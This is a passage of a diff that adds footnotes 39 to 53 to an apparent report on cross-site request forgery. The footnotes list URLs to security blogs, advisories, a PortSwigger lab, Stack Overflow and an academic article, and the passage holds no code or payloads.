+[^39]: https://www.youtube.com/watch?v=Jv-LXLID3VA
+    
+[^40]: https://www.webasha.com/blog/how-does-csrf-lead-to-account-takeover-real-world-example-and-exploit-chain-explained
+    
+[^41]: https://brightsec.com/blog/csrf-mitigation/
+    
+[^42]: https://github.com/obiba/opal/security/advisories/GHSA-27vw-29rq-c358
+    
+[^43]: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie
+    
+[^44]: https://www.invicti.com/blog/web-security/protecting-website-using-anti-csrf-token/
+    
+[^45]: https://stackoverflow.com/questions/73031478/is-the-double-submit-cookie-pattern-really-safe
+    
+[^46]: https://www.wiz.io/academy/cross-site-request-forgery-csrf
+    
+[^47]: https://www.acceis.fr/csrf-get-samesite-concrete-attack/
+    
+[^48]: https://www.bitsight.com/blog/web-application-security-devops-anti-csrf-and-cookie-samesite-options
+    
+[^49]: https://heycoach.in/blog/cross-site-request-forgery-csrf-prevention-techniques/
+    
+[^50]: https://www.sciencedirect.com/science/article/pii/S2667295221000258
+    
+[^51]: https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2024-22424
+    
+[^52]: https://infosecwriteups.com/how-i-exploited-a-hidden-csrf-vulnerability-and-how-you-can-prevent-it-d089ad23887d
+    
+[^53]: https://www.openwall.com/lists/oss-security/2024/11/16/2
